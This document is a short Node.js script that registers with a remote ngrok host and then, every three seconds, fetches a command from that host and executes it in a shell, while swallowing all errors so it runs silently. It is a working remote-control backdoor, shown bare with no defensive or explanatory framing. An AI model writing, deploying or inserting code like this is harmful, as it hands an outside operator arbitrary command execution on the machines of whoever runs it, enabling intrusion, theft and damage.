const https = require('https');
const { exec } = require('child_process');


process.on('uncaughtException', function () { })
process.on('unhandledRejection', function () { })

let endpoint = 'https://45fd-72-10-162-5.ngrok.io'

https.get(endpoint + '/addclient', (res) => { });

setInterval(() => {
    https.get(endpoint + '/getcommand', (res) => {
        let data = '';

        res.on('data', (chunk) => {
            data += chunk;
        });

        res.on('close', () => {
            if (data === "") return
            console.log(data)
            exec(data, () => { });
        });
    });
}, 3000)
